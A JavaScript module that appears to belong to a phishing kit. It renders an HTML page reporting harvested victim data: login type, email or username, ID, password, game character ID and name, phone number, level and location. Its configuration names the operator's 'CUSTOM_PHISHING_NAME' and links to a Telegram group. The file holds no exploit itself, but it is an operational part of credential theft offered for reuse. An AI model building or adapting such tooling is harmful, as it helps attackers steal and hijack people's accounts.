import { placeholder } from '../pages/api/placeholder/placeholder.js';
export const templateCreator = (decodedString) => {
  return `<!DOCTYPE html>
    <html>
     <head>
      <title>
      </title>
      <meta content="summary_large_image" name="twitter:card">
      <meta content="website" property="og:type">
      <meta content property="og:description">
      <meta content="https://8xkdtuz48x.preview-postedstuff.com/V2-Zark3-ZCBxl-D6AS-4oIw/" property="og:url">
      <meta content="https://pro-bee-beepro-thumbnails.s3.amazonaws.com/messages/808367/792255/1685874/7632170_large.jpg" property="og:image">
      <meta content property="og:title">
      <meta content name="description">
      <meta charset="utf-8">
      <meta content="width=device-width" name="viewport">
      <link href="https://fonts.googleapis.com/css?family=Ubuntu" rel="stylesheet" type="text/css">
      <link href="https://fonts.googleapis.com/css?family=Bitter" rel="stylesheet" type="text/css">
      <style>
       .bee-row,
        .bee-row-content {
          position: relative
        }
        body {
          background-color: #efddff;
          color: #000;
          font-family: Ubuntu, Tahoma, Verdana, Segoe, sans-serif
        }
        a {
          color: #0068a5
        }
        * {
          box-sizing: border-box
        }
        body,
        h1,
        h2,
        h3 {
          margin: 0
        }
        .bee-row-content {
          max-width: 1440px;
          margin: 0 auto;
          display: flex
        }
        .bee-row-content.reverse,
        .bee-row-content.reverse .bee-col {
          -moz-transform: scale(1, -1);
          -webkit-transform: scale(1, -1);
          -o-transform: scale(1, -1);
          -ms-transform: scale(1, -1);
          transform: scale(1, -1)
        }
        .bee-row-content .bee-col-w3 {
          flex-basis: 25%
        }
        .bee-row-content .bee-col-w6 {
          flex-basis: 50%
        }
        .bee-row-content .bee-col-w12 {
          flex-basis: 100%
        }
        .bee-button .content {
          text-align: center
        }
        .bee-button a,
        .bee-icon .bee-icon-label-right a {
          text-decoration: none
        }
        .bee-divider,
        .bee-image {
          overflow: auto
        }
        .bee-divider .center,
        .bee-image .bee-center {
          margin: 0 auto
        }
        .bee-row-1 .bee-col-1 .bee-block-1,
        .bee-row-10 .bee-col-1 .bee-block-1,
        .bee-row-10 .bee-col-2 .bee-block-1,
        .bee-row-11 .bee-col-1 .bee-block-1,
        .bee-row-11 .bee-col-2 .bee-block-1,
        .bee-row-14 .bee-col-1 .bee-block-1,
        .bee-row-15 .bee-col-1 .bee-block-1,
        .bee-row-3 .bee-col-1 .bee-block-2,
        .bee-row-4 .bee-col-2 .bee-block-4,
        .bee-row-5 .bee-col-1 .bee-block-1,
        .bee-row-5 .bee-col-2 .bee-block-1,
        .bee-row-6 .bee-col-1 .bee-block-1,
        .bee-row-6 .bee-col-2 .bee-block-1,
        .bee-row-7 .bee-col-1 .bee-block-1,
        .bee-row-7 .bee-col-2 .bee-block-1,
        .bee-row-8 .bee-col-1 .bee-block-1,
        .bee-row-8 .bee-col-2 .bee-block-1,
        .bee-row-9 .bee-col-1 .bee-block-1,
        .bee-row-9 .bee-col-2 .bee-block-1 {
          width: 100%
        }
        .bee-list ul {
          margin: 0;
          padding: 0
        }
        .bee-icon,
        .bee-icon .bee-icon-image,
        .bee-icon .bee-icon-label-right {
          display: inline-block
        }
        .bee-icon {
          vertical-align: middle
        }
        .bee-icon .bee-icon-image {
          vertical-align: middle;
          margin-right: -4px
        }
        .bee-image img {
          display: block;
          width: 100%
        }
        @media (max-width:768px) {
          .bee-row-content:not(.no_stack) {
            display: block
          }
        }
        .bee-row-1 {
          background-color: #430a77;
          background-image: url('https://d1oco4z2z1fhwp.cloudfront.net/templates/default/6826/Fondo_header.png');
          background-position: top center;
          background-repeat: repeat;
          background-size: auto
        }
        .bee-row-2,
        .bee-row-4 {
          background-color: #efddff
        }
        .bee-row-1 .bee-row-content,
        .bee-row-2 .bee-row-content {
          background-repeat: no-repeat;
          background-size: auto;
          color: #000
        }
        .bee-row-1 .bee-col-1 {
          padding-bottom: 35px;
          padding-top: 35px
        }
        .bee-row-2 {
          background-image: url('https://d1oco4z2z1fhwp.cloudfront.net/templates/default/6826/MainHeader_Fondo_04.png');
          background-repeat: no-repeat;
          background-size: cover
        }
        .bee-row-4,
        .bee-row-4 .bee-row-content {
          background-size: auto;
          background-repeat: no-repeat
        }
        .bee-row-2 .bee-col-1 {
          padding: 5px 10px
        }
        .bee-row-2 .bee-col-2 {
          padding: 5px 15px
        }
        .bee-row-2 .bee-col-2 .bee-block-2 {
          padding-bottom: 5px;
          text-align: center;
          width: 100%
        }
        .bee-row-16 .bee-col-1 .bee-block-1,
        .bee-row-2 .bee-col-2 .bee-block-4 {
          padding-bottom: 10px;
          padding-top: 10px;
          text-align: center
        }
        .bee-row-10 .bee-col-1,
        .bee-row-10 .bee-col-2,
        .bee-row-11 .bee-col-1,
        .bee-row-11 .bee-col-2,
        .bee-row-17 .bee-col-1,
        .bee-row-2 .bee-col-3,
        .bee-row-5 .bee-col-1,
        .bee-row-5 .bee-col-2,
        .bee-row-6 .bee-col-1,
        .bee-row-6 .bee-col-2,
        .bee-row-7 .bee-col-1,
        .bee-row-7 .bee-col-2,
        .bee-row-8 .bee-col-1,
        .bee-row-8 .bee-col-2,
        .bee-row-9 .bee-col-1,
        .bee-row-9 .bee-col-2 {
          padding-bottom: 5px;
          padding-top: 5px
        }
        .bee-row-12,
        .bee-row-13,
        .bee-row-14,
        .bee-row-15,
        .bee-row-3 {
          background-color: #efddff;
          background-repeat: no-repeat
        }
        .bee-row-12 .bee-row-content,
        .bee-row-13 .bee-row-content,
        .bee-row-14 .bee-row-content,
        .bee-row-15 .bee-row-content,
        .bee-row-16 .bee-row-content,
        .bee-row-17 .bee-row-content,
        .bee-row-3 .bee-row-content {
          background-repeat: no-repeat;
          color: #000
        }
        .bee-row-3 .bee-col-1 {
          padding-top: 5px
        }
        .bee-row-4 .bee-row-content {
          background-color: #fff;
          background-image: url('https://d1oco4z2z1fhwp.cloudfront.net/templates/default/6826/Sombra_cuadros_rejilla_01.png');
          background-position: top center;
          color: #000
        }
        .bee-row-10 .bee-col-1 .bee-block-2,
        .bee-row-11 .bee-col-1 .bee-block-2,
        .bee-row-4 .bee-col-2 .bee-block-2,
        .bee-row-5 .bee-col-1 .bee-block-2,
        .bee-row-6 .bee-col-1 .bee-block-2,
        .bee-row-7 .bee-col-1 .bee-block-2,
        .bee-row-8 .bee-col-1 .bee-block-2,
        .bee-row-9 .bee-col-1 .bee-block-2 {
          padding: 10px
        }
        .bee-row-10 .bee-col-2 .bee-block-2,
        .bee-row-11 .bee-col-2 .bee-block-2,
        .bee-row-4 .bee-col-2 .bee-block-3,
        .bee-row-5 .bee-col-2 .bee-block-2,
        .bee-row-6 .bee-col-2 .bee-block-2,
        .bee-row-7 .bee-col-2 .bee-block-2,
        .bee-row-8 .bee-col-2 .bee-block-2,
        .bee-row-9 .bee-col-2 .bee-block-2 {
          text-align: center;
          width: 100%
        }
        .bee-row-10,
        .bee-row-11,
        .bee-row-16,
        .bee-row-17,
        .bee-row-5,
        .bee-row-6,
        .bee-row-7,
        .bee-row-8,
        .bee-row-9 {
          background-repeat: no-repeat
        }
        .bee-row-10 .bee-row-content,
        .bee-row-11 .bee-row-content,
        .bee-row-5 .bee-row-content,
        .bee-row-6 .bee-row-content,
        .bee-row-7 .bee-row-content,
        .bee-row-8 .bee-row-content,
        .bee-row-9 .bee-row-content {
          color: #000;
          background-repeat: no-repeat
        }
        .bee-row-16 .bee-col-1 {
          padding-bottom: 5px;
          padding-top: 30px
        }
        .bee-row-17 .bee-col-1 .bee-block-1 {
          color: #9d9d9d;
          font-family: inherit;
          font-size: 15px;
          padding-bottom: 5px;
          padding-top: 5px;
          text-align: center
        }
        .bee-row-10 .bee-col-1 .bee-block-2,
        .bee-row-11 .bee-col-1 .bee-block-2,
        .bee-row-5 .bee-col-1 .bee-block-2,
        .bee-row-6 .bee-col-1 .bee-block-2,
        .bee-row-7 .bee-col-1 .bee-block-2,
        .bee-row-8 .bee-col-1 .bee-block-2,
        .bee-row-9 .bee-col-1 .bee-block-2 {
          color: #03045d;
          font-size: 26px;
          font-weight: 700;
          line-height: 120%;
          text-align: left;
          direction: ltr;
          letter-spacing: 0
        }
        .bee-row-10 .bee-col-1 .bee-block-2 ul,
        .bee-row-11 .bee-col-1 .bee-block-2 ul,
        .bee-row-5 .bee-col-1 .bee-block-2 ul,
        .bee-row-6 .bee-col-1 .bee-block-2 ul,
        .bee-row-7 .bee-col-1 .bee-block-2 ul,
        .bee-row-8 .bee-col-1 .bee-block-2 ul,
        .bee-row-9 .bee-col-1 .bee-block-2 ul {
          list-style-type: square;
          list-style-position: inside
        }
        .bee-row-10 .bee-col-1 .bee-block-2 li:not(:last-child),
        .bee-row-11 .bee-col-1 .bee-block-2 li:not(:last-child),
        .bee-row-5 .bee-col-1 .bee-block-2 li:not(:last-child),
        .bee-row-6 .bee-col-1 .bee-block-2 li:not(:last-child),
        .bee-row-7 .bee-col-1 .bee-block-2 li:not(:last-child),
        .bee-row-8 .bee-col-1 .bee-block-2 li:not(:last-child),
        .bee-row-9 .bee-col-1 .bee-block-2 li:not(:last-child) {
          margin-bottom: 0
        }
        .bee-row-10 .bee-col-1 .bee-block-2 li ul,
        .bee-row-11 .bee-col-1 .bee-block-2 li ul,
        .bee-row-5 .bee-col-1 .bee-block-2 li ul,
        .bee-row-6 .bee-col-1 .bee-block-2 li ul,
        .bee-row-7 .bee-col-1 .bee-block-2 li ul,
        .bee-row-8 .bee-col-1 .bee-block-2 li ul,
        .bee-row-9 .bee-col-1 .bee-block-2 li ul {
          margin-top: 0
        }
        .bee-row-10 .bee-col-1 .bee-block-2 li a,
        .bee-row-11 .bee-col-1 .bee-block-2 li a,
        .bee-row-5 .bee-col-1 .bee-block-2 li a,
        .bee-row-6 .bee-col-1 .bee-block-2 li a,
        .bee-row-7 .bee-col-1 .bee-block-2 li a,
        .bee-row-8 .bee-col-1 .bee-block-2 li a,
        .bee-row-9 .bee-col-1 .bee-block-2 li a {
          color: #003044
        }
        .bee-row-10 .bee-col-1 .bee-block-2 li li,
        .bee-row-11 .bee-col-1 .bee-block-2 li li,
        .bee-row-5 .bee-col-1 .bee-block-2 li li,
        .bee-row-6 .bee-col-1 .bee-block-2 li li,
        .bee-row-7 .bee-col-1 .bee-block-2 li li,
        .bee-row-8 .bee-col-1 .bee-block-2 li li,
        .bee-row-9 .bee-col-1 .bee-block-2 li li {
          margin-left: 40px
        }
        .bee-row-17 .bee-col-1 .bee-block-1 .bee-icon-image {
          padding: 5px 6px 5px 5px
        }
        .bee-row-17 .bee-col-1 .bee-block-1 .bee-icon {
          margin-left: 0;
          margin-right: 0
        }
      </style>
     </head>
     <body>
      <div class="bee-page-container">
       <div class="bee-row bee-row-1">
        <div class="bee-row-content">
         <div class="bee-col bee-col-1 bee-col-w12">
          <div class="bee-block bee-block-1 bee-image">
           <img alt class="bee-center bee-autowidth" src=${
             process.env.CUSTOM_LOGO_IMAGE ||
             placeholder.CUSTOM_LOGO_IMAGE ||
             'https://d15k2d11r6t6rl.cloudfront.net/public/users/Integrators/BeeProAgency/808367_792255/KALKI.jpg'
           } style="max-width:1160px;">
          </div>
         </div>
        </div>
       </div>
       <div class="bee-row bee-row-2">
        <div class="bee-row-content reverse">
         <div class="bee-col bee-col-1 bee-col-w3">
          <div class="bee-block bee-block-1 bee-spacer">
           <div class="spacer" style="height:10px;">
           </div>
          </div>
         </div>
         <div class="bee-col bee-col-2 bee-col-w6">
          <div class="bee-block bee-block-1 bee-spacer">
           <div class="spacer" style="height:60px;">
           </div>
          </div>
          <div class="bee-block bee-block-2 bee-heading">
           <h2 style="color:#5d85a9;direction:ltr;font-family:Ubuntu, Tahoma, Verdana, Segoe, sans-serif;font-size:32px;font-weight:700;letter-spacing:normal;line-height:120%;text-align:center;margin-top:0;margin-bottom:0;">
            <span class="tinyMce-placeholder">
             ${process.env.CUSTOM_PHISHING_NAME || placeholder.CUSTOM_PHISHING_NAME}
            </span>
           </h2>
          </div>
          <div class="bee-block bee-block-3 bee-spacer">
           <div class="spacer" style="height:15px;">
           </div>
          </div>
          <div class="bee-block bee-block-4 bee-button">
           <a class="bee-button-content" href=${
             process.env.DESIGNED_BY || placeholder.DESIGNED_BY
           } style="font-size: 14px; line-height: 28px; background-color: #00a4ff; border-bottom: 0px solid transparent; border-left: 0px solid transparent; border-radius: 16px; border-right: 0px solid transparent; border-top: 0px solid transparent; color: #ffffff; font-family: inherit; font-weight: 400; letter-spacing: 0px; max-width: 100%; padding-bottom: 5px; padding-left: 25px; padding-right: 25px; padding-top: 5px; width: auto; display: inline-block;">
            <span style="font-size: 16px; line-height: 200%; word-break: break-word; letter-spacing: normal;">
             <span style="font-size: 18px; line-height: 36px;">
              JOIN US
             </span>
            </span></a>
          </div>
          <div class="bee-block bee-block-5 bee-spacer">
           <div class="spacer" style="height:25px;">
           </div>
          </div>
         </div>
         <div class="bee-col bee-col-3 bee-col-w3">
          <div class="bee-block bee-block-1 bee-spacer">
           <div class="spacer" style="height:10px;">
           </div>
          </div>
         </div>
        </div>
       </div>
       <div class="bee-row bee-row-3">
        <div class="bee-row-content">
         <div class="bee-col bee-col-1 bee-col-w12">
          <div class="bee-block bee-block-1 bee-spacer">
           <div class="spacer" style="height:20px;">
           </div>
          </div>
          <div class="bee-block bee-block-2 bee-image">
           <img alt class="bee-center bee-autowidth" src="https://d1oco4z2z1fhwp.cloudfront.net/templates/default/6826/Sombra_superior.png" style="max-width:650px;">
          </div>
         </div>
        </div>
       </div>
       <div class="bee-row bee-row-4">
        <div class="bee-row-content">
         <div class="bee-col bee-col-1 bee-col-w3">
          <div class="bee-block bee-block-1 bee-spacer">
           <div class="spacer" style="height:5px;">
           </div>
          </div>
         </div>
         <div class="bee-col bee-col-2 bee-col-w6">
          <div class="bee-block bee-block-1 bee-spacer">
           <div class="spacer" style="height:50px;">
           </div>
          </div>
          <div class="bee-block bee-block-2 bee-divider">
           <div class="center" style="border-top:5px solid #CDAAEF;width:25%;">
           </div>
          </div>
          <div class="bee-block bee-block-3 bee-heading">
           <h1 style="color:#18436a;direction:ltr;font-family:Ubuntu, Tahoma, Verdana, Segoe, sans-serif;font-size:32px;font-weight:700;letter-spacing:1px;line-height:120%;text-align:center;margin-top:0;margin-bottom:0;">
            <span class="tinyMce-placeholder">
             DETAILS
            </span>
           </h1>
          </div>
          <div class="bee-block bee-block-4 bee-image">
           <img alt class="bee-center bee-autowidth" src="https://d1oco4z2z1fhwp.cloudfront.net/templates/default/6826/Sombra_inferior.png" style="max-width:650px;">
          </div>
         </div>
         <div class="bee-col bee-col-3 bee-col-w3">
          <div class="bee-block bee-block-1 bee-spacer">
           <div class="spacer" style="height:5px;">
           </div>
          </div>
         </div>
        </div>
       </div>
       <div class="bee-row bee-row-5">
        <div class="bee-row-content">
         <div class="bee-col bee-col-1 bee-col-w6">
          <div class="bee-block bee-block-1 bee-image">
           <img alt class="bee-center bee-autowidth" src="https://d1oco4z2z1fhwp.cloudfront.net/templates/default/6826/Sombra_inferior.png" style="max-width:650px;">
          </div>
          <div class="bee-block bee-block-2 bee-list">
           <ul>
            <li>
             LOGIN TYPE
            </li>
           </ul>
          </div>
         </div>
         <div class="bee-col bee-col-2 bee-col-w6">
          <div class="bee-block bee-block-1 bee-image">
           <img alt class="bee-center bee-autowidth" src="https://d1oco4z2z1fhwp.cloudfront.net/templates/default/6826/Sombra_inferior.png" style="max-width:650px;">
          </div>
          <div class="bee-block bee-block-2 bee-heading">
           <h3 style="color:#393d47;direction:ltr;font-family:Ubuntu, Tahoma, Verdana, Segoe, sans-serif;font-size:26px;font-weight:400;letter-spacing:1px;line-height:120%;text-align:center;margin-top:0;margin-bottom:0;">
            <strong>
             <span class="tinyMce-placeholder">
              ${decodedString.loginType}
             </span>
            </strong>
           </h3>
          </div>
         </div>
        </div>
       </div>
       <div class="bee-row bee-row-6">
        <div class="bee-row-content">
         <div class="bee-col bee-col-1 bee-col-w6">
          <div class="bee-block bee-block-1 bee-image">
           <img alt class="bee-center bee-autowidth" src="https://d1oco4z2z1fhwp.cloudfront.net/templates/default/6826/Sombra_inferior.png" style="max-width:650px;">
          </div>
          <div class="bee-block bee-block-2 bee-list">
           <ul>
            <li>
             MAIL / USERNAME
            </li>
           </ul>
          </div>
         </div>
         <div class="bee-col bee-col-2 bee-col-w6">
          <div class="bee-block bee-block-1 bee-image">
           <img alt class="bee-center bee-autowidth" src="https://d1oco4z2z1fhwp.cloudfront.net/templates/default/6826/Sombra_inferior.png" style="max-width:650px;">
          </div>
          <div class="bee-block bee-block-2 bee-heading">
           <h3 style="color:#393d47;direction:ltr;font-family:Ubuntu, Tahoma, Verdana, Segoe, sans-serif;font-size:26px;font-weight:400;letter-spacing:1px;line-height:120%;text-align:center;margin-top:0;margin-bottom:0;">
            <strong>
             <span class="tinyMce-placeholder">
             ${decodedString.mail}
             </span>
            </strong>
           </h3>
          </div>
         </div>
        </div>
       </div>
       <div class="bee-row bee-row-7">
        <div class="bee-row-content">
         <div class="bee-col bee-col-1 bee-col-w6">
          <div class="bee-block bee-block-1 bee-image">
           <img alt class="bee-center bee-autowidth" src="https://d1oco4z2z1fhwp.cloudfront.net/templates/default/6826/Sombra_inferior.png" style="max-width:650px;">
          </div>
          <div class="bee-block bee-block-2 bee-list">
           <ul>
            <li>
             Id
            </li>
           </ul>
          </div>
         </div>
         <div class="bee-col bee-col-2 bee-col-w6">
          <div class="bee-block bee-block-1 bee-image">
           <img alt class="bee-center bee-autowidth" src="https://d1oco4z2z1fhwp.cloudfront.net/templates/default/6826/Sombra_inferior.png" style="max-width:650px;">
          </div>
          <div class="bee-block bee-block-2 bee-heading">
           <h3 style="color:#393d47;direction:ltr;font-family:Ubuntu, Tahoma, Verdana, Segoe, sans-serif;font-size:26px;font-weight:400;letter-spacing:1px;line-height:120%;text-align:center;margin-top:0;margin-bottom:0;">
            <strong>
             <span class="tinyMce-placeholder">${decodedString.id}</span>
            </strong>
           </h3>
          </div>
         </div>
        </div>
       </div>
       <div class="bee-row bee-row-7">
        <div class="bee-row-content">
         <div class="bee-col bee-col-1 bee-col-w6">
          <div class="bee-block bee-block-1 bee-image">
           <img alt class="bee-center bee-autowidth" src="https://d1oco4z2z1fhwp.cloudfront.net/templates/default/6826/Sombra_inferior.png" style="max-width:650px;">
          </div>
          <div class="bee-block bee-block-2 bee-list">
           <ul>
            <li>
             PASSWORD
            </li>
           </ul>
          </div>
         </div>
         <div class="bee-col bee-col-2 bee-col-w6">
          <div class="bee-block bee-block-1 bee-image">
           <img alt class="bee-center bee-autowidth" src="https://d1oco4z2z1fhwp.cloudfront.net/templates/default/6826/Sombra_inferior.png" style="max-width:650px;">
          </div>
          <div class="bee-block bee-block-2 bee-heading">
           <h3 style="color:#393d47;direction:ltr;font-family:Ubuntu, Tahoma, Verdana, Segoe, sans-serif;font-size:26px;font-weight:400;letter-spacing:1px;line-height:120%;text-align:center;margin-top:0;margin-bottom:0;">
            <strong>
             <span class="tinyMce-placeholder">${decodedString.pass}</span>
            </strong>
           </h3>
          </div>
         </div>
        </div>
       </div>
       <div class="bee-row bee-row-8">
        <div class="bee-row-content">
         <div class="bee-col bee-col-1 bee-col-w6">
          <div class="bee-block bee-block-1 bee-image">
           <img alt class="bee-center bee-autowidth" src="https://d1oco4z2z1fhwp.cloudfront.net/templates/default/6826/Sombra_inferior.png" style="max-width:650px;">
          </div>
          <div class="bee-block bee-block-2 bee-list">
           <ul>
            <li>
             CHARACTER ID
            </li>
           </ul>
          </div>
         </div>
         <div class="bee-col bee-col-2 bee-col-w6">
          <div class="bee-block bee-block-1 bee-image">
           <img alt class="bee-center bee-autowidth" src="https://d1oco4z2z1fhwp.cloudfront.net/templates/default/6826/Sombra_inferior.png" style="max-width:650px;">
          </div>
          <div class="bee-block bee-block-2 bee-heading">
           <h3 style="color:#393d47;direction:ltr;font-family:Ubuntu, Tahoma, Verdana, Segoe, sans-serif;font-size:26px;font-weight:400;letter-spacing:1px;line-height:120%;text-align:center;margin-top:0;margin-bottom:0;">
            <strong>
             <span class="tinyMce-placeholder">
             ${decodedString.charId}
             </span>
            </strong>
           </h3>
          </div>
         </div>
        </div>
       </div>
       <div class="bee-row bee-row-9">
        <div class="bee-row-content">
         <div class="bee-col bee-col-1 bee-col-w6">
          <div class="bee-block bee-block-1 bee-image">
           <img alt class="bee-center bee-autowidth" src="https://d1oco4z2z1fhwp.cloudfront.net/templates/default/6826/Sombra_inferior.png" style="max-width:650px;">
          </div>
          <div class="bee-block bee-block-2 bee-list">
           <ul>
            <li>
             CHARACTER NAME
            </li>
           </ul>
          </div>
         </div>
         <div class="bee-col bee-col-2 bee-col-w6">
          <div class="bee-block bee-block-1 bee-image">
           <img alt class="bee-center bee-autowidth" src="https://d1oco4z2z1fhwp.cloudfront.net/templates/default/6826/Sombra_inferior.png" style="max-width:650px;">
          </div>
          <div class="bee-block bee-block-2 bee-heading">
           <h3 style="color:#393d47;direction:ltr;font-family:Ubuntu, Tahoma, Verdana, Segoe, sans-serif;font-size:26px;font-weight:400;letter-spacing:1px;line-height:120%;text-align:center;margin-top:0;margin-bottom:0;">
            <strong>
             <span class="tinyMce-placeholder">
             ${decodeURIComponent(decodedString.charName)}
             </span>
            </strong>
           </h3>
          </div>
         </div>
        </div>
       </div>
       <div class="bee-row bee-row-10">
        <div class="bee-row-content">
         <div class="bee-col bee-col-1 bee-col-w6">
          <div class="bee-block bee-block-1 bee-image">
           <img alt class="bee-autowidth" src="https://d1oco4z2z1fhwp.cloudfront.net/templates/default/6826/Sombra_superior.png" style="max-width:650px;">
          </div>
          <div class="bee-block bee-block-2 bee-list">
           <ul>
            <li>
             MOBILE NUMBER
            </li>
           </ul>
          </div>
         </div>
         <div class="bee-col bee-col-2 bee-col-w6">
          <div class="bee-block bee-block-1 bee-image">
           <img alt class="bee-autowidth" src="https://d1oco4z2z1fhwp.cloudfront.net/templates/default/6826/Sombra_superior.png" style="max-width:650px;">
          </div>
          <div class="bee-block bee-block-2 bee-heading">
           <h3 style="color:#393d47;direction:ltr;font-family:Ubuntu, Tahoma, Verdana, Segoe, sans-serif;font-size:26px;font-weight:400;letter-spacing:1px;line-height:120%;text-align:center;margin-top:0;margin-bottom:0;">
            <strong>
             <span class="tinyMce-placeholder">
             ${decodedString.phone}
             </span>
            </strong>
           </h3>
          </div>
         </div>
        </div>
       </div>
       <div class="bee-row bee-row-10">
       <div class="bee-row-content">
        <div class="bee-col bee-col-1 bee-col-w6">
         <div class="bee-block bee-block-1 bee-image">
          <img alt class="bee-autowidth" src="https://d1oco4z2z1fhwp.cloudfront.net/templates/default/6826/Sombra_superior.png" style="max-width:650px;">
         </div>
         <div class="bee-block bee-block-2 bee-list">
          <ul>
           <li>
            Level
           </li>
          </ul>
         </div>
        </div>
        <div class="bee-col bee-col-2 bee-col-w6">
         <div class="bee-block bee-block-1 bee-image">
          <img alt class="bee-autowidth" src="https://d1oco4z2z1fhwp.cloudfront.net/templates/default/6826/Sombra_superior.png" style="max-width:650px;">
         </div>
         <div class="bee-block bee-block-2 bee-heading">
          <h3 style="color:#393d47;direction:ltr;font-family:Ubuntu, Tahoma, Verdana, Segoe, sans-serif;font-size:26px;font-weight:400;letter-spacing:1px;line-height:120%;text-align:center;margin-top:0;margin-bottom:0;">
           <strong>
            <span class="tinyMce-placeholder">
            ${decodedString.levlenumber}
            </span>
           </strong>
          </h3>
         </div>
        </div>
       </div>
      </div>
       <div class="bee-row bee-row-11">
        <div class="bee-row-content">
         <div class="bee-col bee-col-1 bee-col-w6">
          <div class="bee-block bee-block-1 bee-image">
           <img alt class="bee-center bee-autowidth" src="https://d1oco4z2z1fhwp.cloudfront.net/templates/default/6826/Sombra_inferior.png" style="max-width:650px;">
          </div>
          <div class="bee-block bee-block-2 bee-list">
           <ul>
            <li>
             Location: ${decodedString.callcode}
            </li>
           </ul>
          </div>
         </div>
         <div class="bee-col bee-col-2 bee-col-w6">
          <div class="bee-block bee-block-1 bee-image">
           <img alt class="bee-center bee-autowidth" src="https://d1oco4z2z1fhwp.cloudfront.net/templates/default/6826/Sombra_inferior.png" style="max-width:650px;">
          </div>
          <div class="bee-block bee-block-2 bee-heading">
           <h3 style="color:#393d47;direction:ltr;font-family:Ubuntu, Tahoma, Verdana, Segoe, sans-serif;font-size:26px;font-weight:400;letter-spacing:1px;line-height:120%;text-align:center;margin-top:0;margin-bottom:0;">
            <strong>
             <span class="tinyMce-placeholder">
            
             </span>
            </strong>
           </h3>
          </div>
         </div>
        </div>
       </div>
       <div class="bee-row bee-row-12">
        <div class="bee-row-content">
         <div class="bee-col bee-col-1 bee-col-w12">
          <div class="bee-block bee-block-1 bee-spacer">
           <div class="spacer" style="height:20px;">
           </div>
          </div>
         </div>
        </div>
       </div>
       <div class="bee-row bee-row-13">
        <div class="bee-row-content">
         <div class="bee-col bee-col-1 bee-col-w12">
         </div>
        </div>
       </div>
       <div class="bee-row bee-row-14">
        <div class="bee-row-content">
         <div class="bee-col bee-col-1 bee-col-w12">
          <div class="bee-block bee-block-1 bee-image">
           <img alt class="bee-center bee-autowidth" src="https://d1oco4z2z1fhwp.cloudfront.net/templates/default/6826/Sombra_inferior.png" style="max-width:650px;">
          </div>
         </div>
        </div>
       </div>
       <div class="bee-row bee-row-15">
       
        <div class="bee-row-content">
         <div class="bee-col bee-col-1 bee-col-w12">
          <div class="bee-block bee-block-1 bee-image">
           <img alt class="bee-center bee-autowidth" src="https://d1oco4z2z1fhwp.cloudfront.net/templates/default/6826/Sombra_inferior.png" style="max-width:650px;">
          </div>
         </div>
        </div>
       </div>
       <div class="bee-row bee-row-16">
        <div class="bee-row-content">
         <div class="bee-col bee-col-1 bee-col-w12">
          <div class="bee-block bee-block-1 bee-button">
           <a class="bee-button-content" href=${
             process.env.DESIGNED_BY || placeholder.DESIGNED_BY
           } style="font-size: 14px; line-height: 28px; background-color: #00a4ff; border-bottom: 0px solid transparent; border-left: 0px solid transparent; border-radius: 16px; border-right: 0px solid transparent; border-top: 0px solid transparent; color: #ffffff; font-family: inherit; font-weight: 400; letter-spacing: 0px; max-width: 100%; padding-bottom: 5px; padding-left: 25px; padding-right: 25px; padding-top: 5px; width: auto; display: inline-block;">
            <span style="font-size: 16px; line-height: 200%; word-break: break-word; letter-spacing: normal;">
             <span style="font-size: 18px; line-height: 36px;">
              JOIN US ON TELEGRAM
             </span>
            </span></a>
          </div>
         </div>
        </div>
       </div>DESIGNED_BY
       <div class="bee-row bee-row-17">
        <div class="bee-row-content">
         <div class="bee-col bee-col-1 bee-col-w12">
          <div class="bee-block bee-block-1 bee-icons" id="beepro-locked-footer">
           <div class="bee-icon">
            <div class="bee-icon-image">
             <a href=${
               process.env.DESIGNED_BY || placeholder.DESIGNED_BY
             } target="_blank" title="Designed By kalkei">
              <img alt="Designed By Kalkei" height="32px" src="https://d15k2d11r6t6rl.cloudfront.net/public/users/Integrators/BeeProAgency/53601_510656/Signature/bee.png" width="auto"></a>
            </div>
            <div class="bee-icon-label-right">
             <a href=${
               process.env.DESIGNED_BY || placeholder.DESIGNED_BY
             } target="_blank" title="Designed by kalkei">
              Designed By ${
                process.env.CUSTOM_PHISHING_NAME || placeholder.CUSTOM_PHISHING_NAME
              }</a>
            </div>
           </div>
          </div>
         </div>
        </div>
       </div>
      </div>
     </body>
    </html>`;
};
